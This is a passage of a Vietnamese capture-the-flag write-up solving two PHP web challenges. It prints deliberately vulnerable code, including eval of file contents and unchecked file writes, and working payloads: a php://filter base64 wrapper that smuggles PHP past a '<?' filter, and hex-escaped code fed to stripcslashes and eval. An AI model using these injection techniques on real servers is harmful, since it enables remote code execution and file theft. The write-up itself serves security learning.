class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    if (&#36;_GET['p'] === "edit") {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &#36;p = "edit";</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        if (isset(&#36;_POST['data'])) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            &#36;data = &#36;_POST['data'];</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            if (strpos(&#36;data, '&lt;?')  === false &amp;&amp; stripos(&#36;data, 'script')  === false) {  # no interpretable code please.</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                file_put_contents(&#36;_GET['filename'], &#36;data);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                die ('&lt;meta http-equiv="refresh" content="0; url=."&gt;');</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        } elseif (file_exists(&#36;_GET['filename'])){</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            &#36;data = file_get_contents(&#36;_GET['filename']);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">}</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">?&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Phần đặt tên file tại param <code class="inline-code-block">filename</code>
      thì không có vấn đề gì nhưng chỗ
      <code class="inline-code-block">data</code>
      thì có check kiểm tra nếu chứa các tag như
      <code class="inline-code-block">&lt;?</code>
      và
      <code class="inline-code-block">script</code>
      , nếu không có thì sẽ
      <code class="inline-code-block">file_get_contents</code>
      đến file vừa edit. Vậy ý tưởng của bài này thì quá rõ ràng, ta làm sao để inject được code php vào trong param
      <code class="inline-code-block">data</code>
      mà không cần dùng đến
      <code class="inline-code-block">&lt;?</code>
      và
      <code class="inline-code-block">script</code>
      , sau đó truy cập đến file đấy là có thể chạy được code mà ta mong muốn.
    </p>
    <p>Để bypass chỗ này, ta có thể làm các bước sau:</p>
    <ul>
      <li>
        Đặt tên file tại param <code class="inline-code-block">filename</code>
        là một php wrapper filter -&gt; nếu ta truy cập vào filename dưới dạng php wrapper filter là base64 decode, thì
        nội dung bên trong sẽ bị decode theo base64 (tìm hiểu thêm về php wrapper tại
        <a href="https://www.php.net/manual/en/wrappers.php.php" rel="external">đây</a>
         )
      </li>
      <li>
        Đặt data tại param <code class="inline-code-block">data</code>
        là dạng code php chứa
        <code class="inline-code-block">&lt;?</code>
        mà ta mong muốn, nhưng ta phải encode base64 cho nó để khi edit file khi
        <code class="inline-code-block">filename</code>
        đang là một php wrapper decode base64, sau đó
        <code class="inline-code-block">file_get_contents</code>
        tới thì data sẽ được base64 decode trở lại và ta đã thành công trong việc lưu arbitrary php code mà không cần
        dùng đến
        <code class="inline-code-block">&lt;?</code>
        .
      </li>
      <li>Bước cuối cùng quá đơn giản, truy cập tới nó là có thể đọc flag.</li>
    </ul>
    <p>Áp dụng vô bài nào, đầu tiên đặt tên file là</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">php://filter/convert.base64-decode/resource=adu.php</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>edit data thành:</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">// base64 encode từ &lt;?php readfile('../../flag.php');?&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">PD9waHAgcmVhZGZpbGUoJy4uLy4uL2ZsYWcucGhwJyk7Pz4=</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/183102606-802f55d4-cb69-4cdf-8583-06c91412b262.png"
        alt="image" />
    </p>
    <p>Truy cập tới file và</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/183102679-2efc75d7-558d-41e7-b190-316e0e5638c9.png"
        alt="image" />
    </p>
    <h1 id="level09"><a href="#level09">level09</a></h1>
    <p>
      Bài này lại tiếp tục cho ta lưu một đoạn code và đố ta làm sao đọc được <code class="inline-code-block">
        flag.txt
      </code>
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-php">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;?php</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">ini_set('display_errors', 'on');</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">ini_set('error_reporting', E_ALL);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">if( isset (&#36;_GET['submit']) &amp;&amp; isset (&#36;_GET['c'])) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &#36;randVal = sha1 (time ());</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    setcookie ('session_id', &#36;randVal, time () + 2, '', '', true, true);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    try {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &#36;fh = fopen('/tmp/' . &#36;randVal, 'w');</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        fwrite (</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            &#36;fh,</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                   str_replace (</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                ['&lt;?', '?&gt;', '"', "'", '&#36;', '&amp;', '|', '{', '}', ';', '#', ':', '#', ']', '[', ',', '%', '(', ')'],</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                '',</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                &#36;_GET['c']</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            )</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        );</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        fclose(&#36;fh);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    } catch (Exception &#36;e) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        var_dump (&#36;e-&gt;getMessage ());</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">}</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">if (isset (&#36;_GET['cache_file'])) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    if (file_exists (&#36;_GET['cache_file'])) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        echo eval (stripcslashes (file_get_contents (&#36;_GET['cache_file'])));</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">}</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">?&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Phân tích code chỗ này một xíu, đầu tiên nó sẽ set cookie <code class="inline-code-block">session_id</code>
      từ $randVal và hàm
      <code class="inline-code-block">time&lpar&rpar</code>
      , tại param
      <code class="inline-code-block">c</code>
      mà ta input, nó sẽ kiểm tra và thay thế tất cả những kí tự như trong code, sau đấy sẽ ghi vào file được lưu tại
      <code class="inline-code-block">/tmp/&lt;output từ hàm $randVal</code>
      . Rồi cuối cùng kiểm tra nếu có param
      <code class="inline-code-block">cache_file</code>
      thì sẽ
      <code class="inline-code-block">stripcslashes</code>
      cái
      <code class="inline-code-block">file_get_contents</code>
       file từ param này.
    </p>
    <p>
      Sau khi tìm hiểu về <a href="https://www.php.net/manual/en/function.stripcslashes.php" rel="external">
        stripcslashes
      </a>
      thì ta cũng đã biết được hướng làm bài này, cơ bản là thằng stripcslashes kia nó sẽ unescaped string của ta, ngoài
      ra nếu ta thêm nó dưới dạng
      <code class="inline-code-block">\x</code>
       và 2 kí tự tiếp theo, nó sẽ biểu diễn dạng hex:
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/183106409-911d01ff-8f08-47f2-aae9-1d116b90eb89.png"
        alt="image" />
    </p>
    <p>
      Vậy thì mục tiêu bây giờ chỉ là ghi vào file với data là đoạn arbitrary code dưới dạng hex, sau đó dễ dàng truy
      cập tới nó bằng cách set thêm param <code class="inline-code-block">cache_file</code>
      và tên file lấy từ cookie
      <code class="inline-code-block">session_id</code>
       nữa là có thể đọc file flag.
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">\x72\x65\x61\x64\x66\x69\x6c\x65\x28\x27\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x3b</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">readfile('flag.txt');</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/183109782-fb47c245-7307-4694-8ac4-dda9e486a607.png"
        alt="image" />
    </p>
    <p>
      Gửi request thành công, lấy cookie gán cho <code class="inline-code-block">cache_file</code>
       nữa là oke (thêm cái /tmp/ nữa)
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/183109887-2297ab1c-9bba-4a5d-a70b-f907bb40d8c5.png"
        alt="image" />
    </p>
  </article>
</Post>
